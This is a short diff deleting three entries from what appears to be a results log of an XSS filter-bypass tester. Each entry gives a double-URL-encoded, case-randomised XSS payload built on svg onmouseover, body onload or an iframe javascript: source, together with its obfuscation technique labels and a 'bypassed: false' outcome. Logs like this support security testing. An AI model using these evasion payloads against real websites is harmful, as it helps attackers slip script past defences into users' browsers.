@@ -1,3 +1,0 @@
-{"payload": "%253Csvg/onmouseoverfnc%253Dalert%25281%2529%253E", "technique": "Direct JS Call XSS (manual refine)_non_script_xss+obf_url_encode+obf_case_random_full_bypass+SVG onEvent_adv_obf_full_bypass", "attack_type": "xss_dom", "bypassed": false, "status_code": null}
-{"payload": "%25253CBODY%252520oNLOad%25253DAlERT%2525281%252529%25253E", "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+obf_url_encode+obf_case_random_full_bypass", "attack_type": "xss_dom", "bypassed": false, "status_code": null}
-{"payload": "%253cIFRAME%2520SRC%253dJAVASCRIPT%253aALERT%25281%2529%253e", "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass", "attack_type": "xss_dom", "bypassed": false, "status_code": null}
